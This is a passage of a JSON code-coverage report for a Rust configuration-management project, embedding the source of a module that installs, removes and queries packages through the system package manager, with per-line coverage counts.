s":{"Line":2}},{"line":614,"address":[31060657,31060704],"length":1,"stats":{"Line":0}},{"line":617,"address":[31060458],"length":1,"stats":{"Line":1}},{"line":619,"address":[31060012],"length":1,"stats":{"Line":0}},{"line":621,"address":[31060032],"length":1,"stats":{"Line":0}},{"line":623,"address":[31059753],"length":1,"stats":{"Line":0}},{"line":627,"address":[31059673],"length":1,"stats":{"Line":1}},{"line":639,"address":[25445808],"length":1,"stats":{"Line":1}},{"line":641,"address":[25445822],"length":1,"stats":{"Line":1}},{"line":646,"address":[25445734,25444800,25445728],"length":1,"stats":{"Line":0}},{"line":647,"address":[25444831],"length":1,"stats":{"Line":0}},{"line":649,"address":[25444899,25444836],"length":1,"stats":{"Line":0}},{"line":650,"address":[25444921],"length":1,"stats":{"Line":0}},{"line":651,"address":[25444966],"length":1,"stats":{"Line":0}},{"line":652,"address":[25445011],"length":1,"stats":{"Line":0}},{"line":653,"address":[25445056],"length":1,"stats":{"Line":0}},{"line":656,"address":[25445101],"length":1,"stats":{"Line":0}},{"line":657,"address":[25445140],"length":1,"stats":{"Line":0}},{"line":660,"address":[25445179],"length":1,"stats":{"Line":0}},{"line":661,"address":[25445218],"length":1,"stats":{"Line":0}},{"line":662,"address":[25445257],"length":1,"stats":{"Line":0}},{"line":663,"address":[25445296],"length":1,"stats":{"Line":0}},{"line":664,"address":[25445335],"length":1,"stats":{"Line":0}},{"line":667,"address":[25445374],"length":1,"stats":{"Line":0}},{"line":668,"address":[25445413],"length":1,"stats":{"Line":0}},{"line":669,"address":[25445452],"length":1,"stats":{"Line":0}},{"line":672,"address":[25445491],"length":1,"stats":{"Line":0}},{"line":675,"address":[25445530],"length":1,"stats":{"Line":0}},{"line":676,"address":[25445569],"length":1,"stats":{"Line":0}},{"line":677,"address":[25445608],"length":1,"stats":{"Line":0}},{"line":678,"address":[25445647],"length":1,"stats":{"Line":0}},{"line":682,"address":[25445694],"length":1,"stats":{"Line":0}},{"line":686,"address":[25447452,25447216,25447477],"length":1,"stats":{"Line":1}},{"line":687,"address":[25447326,25447246],"length":1,"stats":{"Line":2}},{"line":691,"address":[25445760],"length":1,"stats":{"Line":1}},{"line":692,"address":[25445778],"length":1,"stats":{"Line":1}},{"line":696,"address":[25447184],"length":1,"stats":{"Line":1}},{"line":697,"address":[25447202],"length":1,"stats":{"Line":1}},{"line":701,"address":[25445872],"length":1,"stats":{"Line":0}},{"line":702,"address":[32907392,32907417],"length":1,"stats":{"Line":0}},{"line":706,"address":[25447158,25447152,25445952],"length":1,"stats":{"Line":0}},{"line":712,"address":[25446122,25446252],"length":1,"stats":{"Line":0}},{"line":713,"address":[25446085],"length":1,"stats":{"Line":0}},{"line":714,"address":[25446188,25446109],"length":1,"stats":{"Line":0}},{"line":717,"address":[25446333,25447150,25446408],"length":1,"stats":{"Line":0}},{"line":720,"address":[25446557],"length":1,"stats":{"Line":0}},{"line":721,"address":[25446756,25446956],"length":1,"stats":{"Line":0}},{"line":722,"address":[25446971],"length":1,"stats":{"Line":0}},{"line":727,"address":[25446782],"length":1,"stats":{"Line":0}},{"line":728,"address":[25446824,25446926],"length":1,"stats":{"Line":0}},{"line":730,"address":[25446871,25446799],"length":1,"stats":{"Line":0}},{"line":736,"address":[25440528],"length":1,"stats":{"Line":0}},{"line":737,"address":[25440536],"length":1,"stats":{"Line":0}}],"covered":86,"coverable":194},{"path":["/","home","artur","Repositories","rustible","src","modules","package.rs"],"content":"//! Package module - Package management\n//!\n//! This module manages packages on the system using the appropriate package manager\n//! (apt, dnf, yum, pacman, zypper, etc.).\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParallelizationHint, ParamExt,\n};\nuse std::collections::HashMap;\nuse std::process::Command;\n\n/// Supported package managers\n#[derive(Debug, Clone, PartialEq)]\npub enum PackageManager {\n    Apt,\n    Dnf,\n    Yum,\n    Pacman,\n    Zypper,\n    Apk,\n    Brew,\n}\n\nimpl PackageManager {\n    fn detect() -\u003e Option\u003cSelf\u003e {\n        // Check for package managers in order of preference\n        let managers = [\n            (\"apt-get\", PackageManager::Apt),\n            (\"dnf\", PackageManager::Dnf),\n            (\"yum\", PackageManager::Yum),\n            (\"pacman\", PackageManager::Pacman),\n            (\"zypper\", PackageManager::Zypper),\n            (\"apk\", PackageManager::Apk),\n            (\"brew\", PackageManager::Brew),\n        ];\n\n        for (cmd, manager) in managers {\n            if Command::new(\"which\")\n                .arg(cmd)\n                .output()\n                .map(|o| o.status.success())\n                .unwrap_or(false)\n            {\n                return Some(manager);\n            }\n        }\n\n        None\n    }\n\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"apt\" | \"apt-get\" =\u003e Ok(PackageManager::Apt),\n            \"dnf\" =\u003e Ok(PackageManager::Dnf),\n            \"yum\" =\u003e Ok(PackageManager::Yum),\n            \"pacman\" =\u003e Ok(PackageManager::Pacman),\n            \"zypper\" =\u003e Ok(PackageManager::Zypper),\n            \"apk\" =\u003e Ok(PackageManager::Apk),\n            \"brew\" | \"homebrew\" =\u003e Ok(PackageManager::Brew),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Unknown package manager: {}\",\n                s\n            ))),\n        }\n    }\n\n    fn install_cmd(\u0026self) -\u003e Vec\u003c\u0026'static str\u003e {\n        match self {\n            PackageManager::Apt =\u003e vec![\"apt-get\", \"install\", \"-y\"],\n            PackageManager::Dnf =\u003e vec![\"dnf\", \"install\", \"-y\"],\n            PackageManager::Yum =\u003e vec![\"yum\", \"install\", \"-y\"],\n            PackageManager::Pacman =\u003e vec![\"pacman\", \"-S\", \"--noconfirm\"],\n            PackageManager::Zypper =\u003e vec![\"zypper\", \"install\", \"-y\"],\n            PackageManager::Apk =\u003e vec![\"apk\", \"add\"],\n            PackageManager::Brew =\u003e vec![\"brew\", \"install\"],\n        }\n    }\n\n    fn remove_cmd(\u0026self) -\u003e Vec\u003c\u0026'static str\u003e {\n        match self {\n            PackageManager::Apt =\u003e vec![\"apt-get\", \"remove\", \"-y\"],\n            PackageManager::Dnf =\u003e vec![\"dnf\", \"remove\", \"-y\"],\n            PackageManager::Yum =\u003e vec![\"yum\", \"remove\", \"-y\"],\n            PackageManager::Pacman =\u003e vec![\"pacman\", \"-R\", \"--noconfirm\"],\n            PackageManager::Zypper =\u003e vec![\"zypper\", \"remove\", \"-y\"],\n            PackageManager::Apk =\u003e vec![\"apk\", \"del\"],\n            PackageManager::Brew =\u003e vec![\"brew\", \"uninstall\"],\n        }\n    }\n\n    fn update_cmd(\u0026self) -\u003e Vec\u003c\u0026'static str\u003e {\n        match self {\n            PackageManager::Apt =\u003e vec![\"apt-get\", \"update\"],\n            PackageManager::Dnf =\u003e vec![\"dnf\", \"makecache\"],\n            PackageManager::Yum =\u003e vec![\"yum\", \"makecache\"],\n            PackageManager::Pacman =\u003e vec![\"pacman\", \"-Sy\"],\n            PackageManager::Zypper =\u003e vec![\"zypper\", \"refresh\"],\n            PackageManager::Apk =\u003e vec![\"apk\", \"update\"],\n            PackageManager::Brew =\u003e vec![\"brew\", \"update\"],\n        }\n    }\n\n    #[allow(dead_code)]\n    fn upgrade_cmd(\u0026self) -\u003e Vec\u003c\u0026'static str\u003e {\n        match self {\n            PackageManager::Apt =\u003e vec![\"apt-get\", \"upgrade\", \"-y\"],\n            PackageManager::Dnf =\u003e vec![\"dnf\", \"upgrade\", \"-y\"],\n            PackageManager::Yum =\u003e vec![\"yum\", \"upgrade\", \"-y\"],\n            PackageManager::Pacman =\u003e vec![\"pacman\", \"-Su\", \"--noconfirm\"],\n            PackageManager::Zypper =\u003e vec![\"zypper\", \"update\", \"-y\"],\n            PackageManager::Apk =\u003e vec![\"apk\", \"upgrade\"],\n            PackageManager::Brew =\u003e vec![\"brew\", \"upgrade\"],\n        }\n    }\n\n    fn is_installed(\u0026self, package: \u0026str) -\u003e ModuleResult\u003cbool\u003e {\n        let result = match self {\n            PackageManager::Apt =\u003e Command::new(\"dpkg\")\n                .args([\"-s\", package])\n                .output()\n                .map(|o| o.status.success()),\n            PackageManager::Dnf | PackageManager::Yum =\u003e Command::new(\"rpm\")\n                .args([\"-q\", package])\n                .output()\n                .map(|o| o.status.success()),\n            PackageManager::Pacman =\u003e Command::new(\"pacman\")\n                .args([\"-Q\", package])\n                .output()\n                .map(|o| o.status.success()),\n            PackageManager::Zypper =\u003e Command::new(\"rpm\")\n                .args([\"-q\", package])\n                .output()\n                .map(|o| o.status.success()),\n            PackageManager::Apk =\u003e Command::new(\"apk\")\n                .args([\"info\", \"-e\", package])\n                .output()\n                .map(|o| o.status.success()),\n            PackageManager::Brew =\u003e Command::new(\"brew\")\n                .args([\"list\", package])\n                .output()\n                .map(|o| o.status.success()),\n        };\n\n        result.map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to check package status: {}\", e))\n        })\n    }\n\n    fn get_installed_version(\u0026self, package: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        let output = match self {\n            PackageManager::Apt =\u003e Command::new(\"dpkg-query\")\n                .args([\"-W\", \"-f=${Version}\", package])\n                .output(),\n            PackageManager::Dnf | PackageManager::Yum | PackageManager::Zypper =\u003e {\n                Command::new(\"rpm\")\n                    .args([\"-q\", \"--qf\", \"%{VERSION}-%{RELEASE}\", package])\n                    .output()\n            }\n            PackageManager::Pacman =\u003e Command::new(\"pacman\").args([\"-Q\", package]).output(),\n            PackageManager::Apk =\u003e Command::new(\"apk\").args([\"version\", package]).output(),\n            PackageManager::Brew =\u003e Command::new(\"brew\")\n                .args([\"info\", \"--json=v1\", package])\n                .output(),\n        };\n\n        match output {\n            Ok(o) if o.status.success() =\u003e {\n                let version = String::from_utf8_lossy(\u0026o.stdout).trim().to_string();\n                if version.is_empty() {\n                    Ok(None)\n                } else {\n                    Ok(Some(version))\n                }\n            }\n            _ =\u003e Ok(None),\n        }\n    }\n}\n\n/// Desired state for a package\n#[derive(Debug, Clone, PartialEq)]\npub enum PackageState {\n    Present,\n    Absent,\n    Latest,\n}\n\nimpl PackageState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"present\" | \"installed\" =\u003e Ok(PackageState::Present),\n            \"absent\" | \"removed\" =\u003e Ok(PackageState::Absent),\n            \"latest\" =\u003e Ok(PackageState::Latest),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: present, absent, latest\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Module for package management\npub struct PackageModule;\n\nimpl PackageModule {\n    fn run_package_command(\n        cmd: \u0026[\u0026str],\n        packages: \u0026[String],\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        if cmd.is_empty() {\n            return Err(ModuleError::ExecutionFailed(\"Empty command\".to_string()));\n        }\n\n        let mut command = Command::new(cmd[0]);\n        if cmd.len() \u003e 1 {\n            command.args(\u0026cmd[1..]);\n        }\n        command.args(packages);\n\n        let output = command.output().map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to execute package command: {}\", e))\n        })?;\n\n        let stdout = String::from_utf8_lossy(\u0026output.stdout).to_string();\n        let stderr = String::from_utf8_lossy(\u0026output.stderr).to_string();\n\n        Ok((output.status.success(), stdout, stderr))\n    }\n}\n\nimpl Module for PackageModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"package\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage packages using the system package manager\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn parallelization_hint(\u0026self) -\u003e ParallelizationHint {\n        // Package managers use locks - only one can run per host at a time\n        ParallelizationHint::HostExclusive\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"name\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Get package manager\n        let pkg_manager = if let Some(pm_str) = params.get_string(\"use\")? {\n            PackageManager::from_str(\u0026pm_str)?\n        } else {\n            PackageManager::detect().ok_or_else(|| {\n                ModuleError::ExecutionFailed(\"Could not detect package manager\".to_string())\n            })?\n        };\n\n        // Get packages - can be a single package or a list\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = PackageState::from_str(\u0026state_str)?;\n        let update_cache = params.get_bool_or(\"update_cache\", false);\n\n        // Update cache if requested\n        if update_cache {\n            if context.check_mode {\n                // In check mode, just note we would update\n            } else {\n                let update_cmd = pkg_manager.update_cmd();\n                let mut cmd = Command::new(update_cmd[0]);\n                if update_cmd.len() \u003e 1 {\n                    cmd.args(\u0026update_cmd[1..]);\n                }\n                let _ = cmd.output(); // Ignore errors for cache update\n            }\n        }\n\n        // Track what we'll do\n        let mut to_install: Vec\u003cString\u003e = Vec::new();\n        let mut to_remove: Vec\u003cString\u003e = Vec::new();\n        let mut already_ok: Vec\u003cString\u003e = Vec::new();\n\n        for package in \u0026packages {\n            let is_installed = pkg_manager.is_installed(package)?;\n\n            match state {\n                PackageState::Present =\u003e {\n                    if is_installed {\n                        already_ok.push(package.clone());\n                    } else {\n                        to_install.push(package.clone());\n                    }\n                }\n                PackageState::Absent =\u003e {\n                    if is_installed {\n                        to_remove.push(package.clone());\n                    } else {\n                        already_ok.push(package.clone());\n                    }\n                }\n                PackageState::Latest =\u003e {\n                    // For 'latest', we always try to install/upgrade\n                    to_install.push(package.clone());\n                }\n            }\n        }\n\n        // Check mode - return what would happen\n        if context.check_mode {\n            if to_install.is_empty() \u0026\u0026 to_remove.is_empty() {\n                return Ok(ModuleOutput::ok(format!(\n                    \"All packages already in desired state: {}\",\n                    already_ok.join(\", \")\n                )));\n            }\n\n            let mut msg = String::new();\n            if !to_install.is_empty() {\n                msg.push_str(\u0026format!(\"Would install: {}. \", to_install.join(\", \")));\n            }\n            if !to_remove.is_empty() {\n                msg.push_str(\u0026format!(\"Would remove: {}. \", to_remove.join(\", \")));\n            }\n\n            return Ok(ModuleOutput::changed(msg.trim().to_string()));\n        }\n\n        // Perform the actual operations\n        let mut changed = false;\n        let mut results: HashMap\u003cString, String\u003e = HashMap::new();\n\n        if !to_install.is_empty() {\n            let install_cmd = pkg_manager.install_cmd();\n            let (success, stdout, stderr) = Self::run_package_command(\u0026install_cmd, \u0026to_install)?;\n\n            if !success {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Failed to install packages: {}\",\n                    if stderr.is_empty() { stdout } else { stderr }\n                )));\n            }\n\n            changed = true;\n            for pkg in \u0026to_install {\n                results.insert(pkg.clone(), \"installed\".to_string());\n            }\n        }\n\n        if !to_remove.is_empty() {\n            let remove_cmd = pkg_manager.remove_cmd();\n            let (success, stdout, stderr) = Self::run_package_command(\u0026remove_cmd, \u0026to_remove)?;\n\n            if !success {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Failed to remove packages: {}\",\n                    if stderr.is_empty() { stdout } else { stderr }\n                )));\n            }\n\n            changed = true;\n            for pkg in \u0026to_remove {\n                results.insert(pkg.clone(), \"removed\".to_string());\n            }\n        }\n\n        for pkg in \u0026already_ok {\n            results.insert(pkg.clone(), \"ok\".to_string());\n        }\n\n        if changed {\n            let mut msg = String::new();\n            if !to_install.is_empty() {\n                msg.push_str(\u0026format!(\"Installed: {}. \", to_install.join(\", \")));\n            }\n            if !to_remove.is_empty() {\n                msg.push_str(\u0026format!(\"Removed: {}. \", to_remove.join(\", \")));\n            }\n\n            Ok(ModuleOutput::changed(msg.trim().to_string())\n                .with_data(\"results\", serde_json::json!(results)))\n        } else {\n            Ok(\n                ModuleOutput::ok(\"All packages already in desired state\".to_string())\n                    .with_data(\"results\", serde_json::json!(results)),\n            )\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, _context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let pkg_manager = if let Some(pm_str) = params.get_string(\"use\")? {\n            PackageManager::from_str(\u0026pm_str)?\n        } else {\n            match PackageManager::detect() {\n                Some(pm) =\u003e pm,\n                None =\u003e return Ok(None),\n            }\n        };\n\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = PackageState::from_str(\u0026state_str)?;\n\n        let mut before_lines = Vec::new();\n        let mut after_lines = Vec::new();\n\n        for package in \u0026packages {\n            let is_installed = pkg_manager.is_installed(package)?;\n            let version = pkg_manager\n                .get_installed_version(package)?\n                .unwrap_or_default();\n\n            match state {\n                PackageState::Present | PackageState::Latest =\u003e {\n                    if is_installed {\n                        before_lines.push(format!(\"{}: {}\", package, version));\n                        after_lines.push(format!(\"{}: {}\", package, version));\n                    } else {\n                        before_lines.push(format!(\"{}: (not installed)\", package));\n                        after_lines.push(format!(\"{}: (will be installed)\", package));\n                    }\n                }\n                PackageState::Absent =\u003e {\n                    if is_installed {\n                        before_lines.push(format!(\"{}: {}\", package, version));\n                        after_lines.push(format!(\"{}: (will be removed)\", package));\n                    } else {\n                        before_lines.push(format!(\"{}: (not installed)\", package));\n                        after_lines.push(format!(\"{}: (not installed)\", package));\n                    }\n                }\n            }\n        }\n\n        Ok(Some(Diff::new(\n            before_lines.join(\"\\n\"),\n            after_lines.join(\"\\n\"),\n        )))\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_package_state_from_str() {\n        assert_eq!(\n            PackageState::from_str(\"present\").unwrap(),\n            PackageState::Present\n        );\n        assert_eq!(\n            PackageState::from_str(\"installed\").unwrap(),\n            PackageState::Present\n        );\n        assert_eq!(\n            PackageState::from_str(\"absent\").unwrap(),\n            PackageState::Absent\n        );\n        assert_eq!(\n            PackageState::from_str(\"removed\").unwrap(),\n            PackageState::Absent\n        );\n        assert_eq!(\n            PackageState::from_str(\"latest\").unwrap(),\n            PackageState::Latest\n        );\n        assert!(PackageState::from_str(\"invalid\").is_err());\n    }\n\n    #[test]\n    fn test_package_manager_from_str() {\n        assert_eq!(\n            PackageManager::from_str(\"apt\").unwrap(),\n            PackageManager::Apt\n        );\n        assert_eq!(\n            PackageManager::from_str(\"dnf\").unwrap(),\n            PackageManager::Dnf\n        );\n        assert_eq!(\n            PackageManager::from_str(\"pacman\").unwrap(),\n            PackageManager::Pacman\n        );\n        assert!(PackageManager::from_str(\"invalid\").is_err());\n    }\n\n    #[test]\n    fn test_package_manager_commands() {\n        let apt = PackageManager::Apt;\n        assert_eq!(apt.install_cmd(), vec![\"apt-get\", \"install\", \"-y\"]);\n        assert_eq!(apt.remove_cmd(), vec![\"apt-get\", \"remove\", \"-y\"]);\n\n        let pacman = PackageManager::Pacman;\n        assert_eq!(pacman.install_cmd(), vec![\"pacman\", \"-S\", \"--noconfirm\"]);\n        assert_eq!(pacman.remove_cmd(), vec![\"pacman\", \"-R\", \"--noconfirm\"]);\n    }\n\n    // Integration tests would require actual package manager access\n    // These are unit tests for the parsing/configuration logic\n}\n","traces":[{"line":26,"address":[30877275,30876240,30877269],"length":1,"stats":{"Line":0}},{"line":28,"address":[30876492],"length":1,"stats":{"Line":0}},{"line":29,"address":[30876247],"length":1,"stats":{"Line":0}},{"line":30,"address":[30876282],"length":1,"stats":{"Line":0}},{"line":31,"address":[30876317],"length":1,"stats":{"Line":0}},{"line":32,"address":[30876352],"length":1,"stats":{"Line":0}},{"line":33,"address":[30876387],"length":1,"stats":{"Line":0}},{"line":34,"address":[30876422],"length":1,"stats":{"Line":0}},{"line":35,"address":[30876457],"length":1,"stats":{"Line":0}},{"line":38,"address":[30876902,30876795],"length":1,"stats":{"Line":0}},{"line":39,"address":[30876989,30877196],"length":1,"stats":{"Line":0}},{"line":40,"address":[30877064],"length":1,"stats":{"Line":0}},{"line":42,"address":[26464649,26464640],"length":1,"stats":{"Line":0}},{"line":45,"address":[30877247],"length":1,"stats":{"Line":0}},{"line":49,"address":[30877029],"length":1,"stats":{"Line":0}},{"line":52,"address":[30878267,30878273,30877296],"length":1,"stats":{"Line":1}},{"line":53,"address":[30877425,30877323],"length":1,"stats":{"Line":2}},{"line":54,"address":[30877441],"length":1,"stats":{"Line":1}},{"line":55,"address":[30877625,30877554],"length":1,"stats":{"Line":2}},{"line":56,"address":[30877695,30877651,30877597],"length":1,"stats":{"Line":2}},{"line":57,"address":[30877721,30877765,30877667],"length":1,"stats":{"Line":3}},{"line":58,"address":[30877835,30877737,30877791],"length":1,"stats":{"Line":2}},{"line":59,"address":[30877861,30877807,30877905],"length":1,"stats":{"Line":2}},{"line":60,"address":[30877877,30877931],"length":1,"stats":{"Line":2}},{"line":61,"address":[30878010],"length":1,"stats":{"Line":1}},{"line":68,"address":[30869744],"length":1,"stats":{"Line":1}},{"line":69,"address":[30869763],"length":1,"stats":{"Line":1}},{"line":70,"address":[30869794,30870071],"length":1,"stats":{"Line":2}},{"line":71,"address":[30870218,30869833],"length":1,"stats":{"Line":0}},{"line":72,"address":[30869872,30870358],"length":1,"stats":{"Line":0}},{"line":73,"address":[30870498,30869911],"length":1,"stats":{"Line":2}},{"line":74,"address":[30870638,30869950],"length":1,"stats":{"Line":0}},{"line":75,"address":[30870778,30869989],"length":1,"stats":{"Line":0}},{"line":76,"address":[30870028,30870898],"length":1,"stats":{"Line":0}},{"line":80,"address":[30867280],"length":1,"stats":{"Line":1}},{"line":81,"address":[30867299],"length":1,"stats":{"Line":1}},{"line":82,"address":[30867330,30867607],"length":1,"stats":{"Line":2}},{"line":83,"address":[30867369,30867754],"length":1,"stats":{"Line":0}},{"line":84,"address":[30867408,30867894],"length":1,"stats":{"Line":0}},{"line":85,"address":[30867447,30868034],"length":1,"stats":{"Line":2}},{"line":86,"address":[30868174,30867486],"length":1,"stats":{"Line":0}},{"line":87,"address":[30868314,30867525],"length":1,"stats":{"Line":0}},{"line":88,"address":[30867564,30868434],"length":1,"stats":{"Line":0}},{"line":92,"address":[30868560],"length":1,"stats":{"Line":0}},{"line":93,"address":[30868579],"length":1,"stats":{"Line":0}},{"line":94,"address":[30868610,30868887],"length":1,"stats":{"Line":0}},{"line":95,"address":[30868649,30869015],"length":1,"stats":{"Line":0}},{"line":96,"address":[30869133,30868688],"length":1,"stats":{"Line":0}},{"line":97,"address":[30868727,30869254],"length":1,"stats":{"Line":0}},{"line":98,"address":[30869375,30868766],"length":1,"stats":{"Line":0}},{"line":99,"address":[30868805,30869496],"length":1,"stats":{"Line":0}},{"line":100,"address":[30868844,30869616],"length":1,"stats":{"Line":0}},{"line":105,"address":[30871024],"length":1,"stats":{"Line":0}},{"line":106,"address":[30871043],"length":1,"stats":{"Line":0}},{"line":107,"address":[30871351,30871074],"length":1,"stats":{"Line":0}},{"line":108,"address":[30871113,30871498],"length":1,"stats":{"Line":0}},{"line":109,"address":[30871152,30871638],"length":1,"stats":{"Line":0}},{"line":110,"address":[30871191,30871778],"length":1,"stats":{"Line":0}},{"line":111,"address":[30871918,30871230],"length":1,"stats":{"Line":0}},{"line":112,"address":[30871269,30872058],"length":1,"stats":{"Line":0}},{"line":113,"address":[30871308,30872178],"length":1,"stats":{"Line":0}},{"line":117,"address":[30873259,30873265,30872304],"length":1,"stats":{"Line":0}},{"line":118,"address":[30872358],"length":1,"stats":{"Line":0}},{"line":119,"address":[30872395],"length":1,"stats":{"Line":0}},{"line":120,"address":[30872440],"length":1,"stats":{"Line":0}},{"line":122,"address":[26464457,26464448],"length":1,"stats":{"Line":0}},{"line":123,"address":[30872506],"length":1,"stats":{"Line":0}},{"line":124,"address":[30872551],"length":1,"stats":{"Line":0}},{"line":126,"address":[30873278,30873359],"length":1,"stats":{"Line":0}},{"line":127,"address":[30872617],"length":1,"stats":{"Line":0}},{"line":128,"address":[30872662],"length":1,"stats":{"Line":0}},{"line":130,"address":[30873385,30873469],"length":1,"stats":{"Line":0}},{"line":131,"address":[30872728],"length":1,"stats":{"Line":0}},{"line":132,"address":[30872773],"length":1,"stats":{"Line":0}},{"line":134,"address":[26464265,26464256],"length":1,"stats":{"Line":0}},{"line":135,"address":[30872839],"length":1,"stats":{"Line":0}},{"line":136,"address":[30872884],"length":1,"stats":{"Line":0}},{"line":138,"address":[30873605,30873689],"length":1,"stats":{"Line":0}},{"line":139,"address":[30872977],"length":1,"stats":{"Line":0}},{"line":140,"address":[30873022],"length":1,"stats":{"Line":0}},{"line":142,"address":[26464064,26464073],"length":1,"stats":{"Line":0}},{"line":145,"address":[30873198],"length":1,"stats":{"Line":0}},{"line":146,"address":[26463819,26463887],"length":1,"stats":{"Line":0}},{"line":150,"address":[30873840,30874803,30874797],"length":1,"stats":{"Line":0}},{"line":151,"address":[30873903],"length":1,"stats":{"Line":0}},{"line":152,"address":[30873956],"length":1,"stats":{"Line":0}},{"line":153,"address":[30874013],"length":1,"stats":{"Line":0}},{"line":156,"address":[30874109],"length":1,"stats":{"Line":0}},{"line":157,"address":[30874160],"length":1,"stats":{"Line":0}},{"line":160,"address":[30874283,30874816],"length":1,"stats":{"Line":0}},{"line":161,"address":[30875003,30874400],"length":1,"stats":{"Line":0}},{"line":162,"address":[30874517],"length":1,"stats":{"Line":0}},{"line":163,"address":[30874568],"length":1,"stats":{"Line":0}},{"line":167,"address":[30874751],"length":1,"stats":{"Line":0}},{"line":168,"address":[30875378,30875281],"length":1,"stats":{"Line":0}},{"line":169,"address":[30875538,30875459],"length":1,"stats":{"Line":0}},{"line":170,"address":[30875948,30875762],"length":1,"stats":{"Line":0}},{"line":171,"address":[30875958],"length":1,"stats":{"Line":0}},{"line":173,"address":[30875795],"length":1,"stats":{"Line":0}},{"line":176,"address":[30875201],"length":1,"stats":{"Line":0}},{"line":190,"address":[30865072,30865771,30865765],"length":1,"stats":{"Line":1}},{"line":191,"address":[30865099,30865201],"length":1,"stats":{"Line":2}},{"line":192,"address":[30865217],"length":1,"stats":{"Line":1}},{"line":193,"address":[30865330],"length":1,"stats":{"Line":1}},{"line":194,"address":[30865443,30865513],"length":1,"stats":{"Line":2}},{"line":195,"address":[30865535,30865481],"length":1,"stats":{"Line":2}},{"line":207,"address":[30867233,30865792,30867255],"length":1,"stats":{"Line":0}},{"line":211,"address":[30865877],"length":1,"stats":{"Line":0}},{"line":212,"address":[30865908],"length":1,"stats":{"Line":0}},{"line":215,"address":[30866064,30866102,30865892],"length":1,"stats":{"Line":0}},{"line":216,"address":[30866089],"length":1,"stats":{"Line":0}},{"line":217,"address":[30866245,30866154],"length":1,"stats":{"Line":0}},{"line":219,"address":[30866137],"length":1,"stats":{"Line":0}},{"line":221,"address":[26463520,26463769,26463775],"length":1,"stats":{"Line":0}},{"line":222,"address":[26463615,26463547],"length":1,"stats":{"Line":0}},{"line":225,"address":[30866557,30866636],"length":1,"stats":{"Line":0}},{"line":226,"address":[30866786],"length":1,"stats":{"Line":0}},{"line":228,"address":[30866978],"length":1,"stats":{"Line":0}},{"line":233,"address":[30853664],"length":1,"stats":{"Line":0}},{"line":237,"address":[30848464],"length":1,"stats":{"Line":0}},{"line":241,"address":[30848496],"length":1,"stats":{"Line":0}},{"line":245,"address":[30848544],"length":1,"stats":{"Line":0}},{"line":250,"address":[30848512],"length":1,"stats":{"Line":0}},{"line":254,"address":[30855079,30854128,30855073],"length":1,"stats":{"Line":0}},{"line":260,"address":[30855210,30854217],"length":1,"stats":{"Line":0}},{"line":261,"address":[30854594,30854776],"length":1,"stats":{"Line":0}},{"line":263,"address":[30854620,30855164],"length":1,"stats":{"Line":0}},{"line":264,"address":[26459118],"length":1,"stats":{"Line":0}},{"line":269,"address":[30854951,30855223,30855493],"length":1,"stats":{"Line":0}},{"line":270,"address":[30855445],"length":1,"stats":{"Line":0}},{"line":272,"address":[30855591,30855505,30865002],"length":1,"stats":{"Line":0}},{"line":275,"address":[30856117,30865000,30856033],"length":1,"stats":{"Line":0}},{"line":277,"address":[30856174],"length":1,"stats":{"Line":0}},{"line":278,"address":[30864979,30856303,30856212],"length":1,"stats":{"Line":0}},{"line":279,"address":[30856464],"length":1,"stats":{"Line":0}},{"line":282,"address":[30856511],"length":1,"stats":{"Line":0}},{"line":283,"address":[30856545],"length":1,"stats":{"Line":0}},{"line":286,"address":[30856570],"length":1,"stats":{"Line":0}},{"line":287,"address":[30856577,30856667],"length":1,"stats":{"Line":0}},{"line":288,"address":[30856689,30856765],"length":1,"stats":{"Line":0}},{"line":289,"address":[30856798],"length":1,"stats":{"Line":0}},{"line":291,"address":[30856882,30856771],"length":1,"stats":{"Line":0}},{"line":296,"address":[30856515],"length":1,"stats":{"Line":0}},{"line":297,"address":[30856930],"length":1,"stats":{"Line":0}},{"line":298,"address":[30856993],"length":1,"stats":{"Line":0}},{"line":300,"address":[30857145,30857053],"length":1,"stats":{"Line":0}},{"line":301,"address":[30864917,30857259,30864404],"length":1,"stats":{"Line":0}},{"line":303,"address":[30864561],"length":1,"stats":{"Line":0}},{"line":305,"address":[30864596],"length":1,"stats":{"Line":0}},{"line":306,"addre